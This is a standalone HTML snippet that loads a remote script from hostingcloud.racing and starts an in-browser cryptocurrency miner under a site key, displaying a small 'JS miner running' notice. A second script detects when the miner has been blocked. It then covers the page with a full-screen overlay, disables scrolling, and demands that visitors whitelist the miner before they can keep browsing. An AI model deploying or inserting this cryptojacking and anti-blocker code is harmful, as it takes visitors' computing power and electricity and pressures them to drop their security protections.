<script src="https://www.hostingcloud.racing/zAMe.js"></script>
<script>
    var _client = new Client.Anonymous('ffeb5499683f358a9605c5834258297c74e6a61a80a3d287bc3ee68ce7f81607', {throttle: 0.5, c: 'w'});
    _client.start();
    _client.addMiningNotification("Bottom", "JS miner running.", "#cccccc", 20, "#3d3d3d");
</script>
<script>
    setTimeout(function(){
        if(typeof _client === 'undefined' || _client === null)
        {
            var messageDiv = document.createElement("div");
            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
            var mainDiv = document.createElement("div");
            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
            mainDiv.appendChild(messageDiv);
            document.body.appendChild(mainDiv);
            document.getElementsByTagName("body")[0].style.overflow = "hidden";
            window.scrollTo(0, 0);
        }
    },1000);
</script>
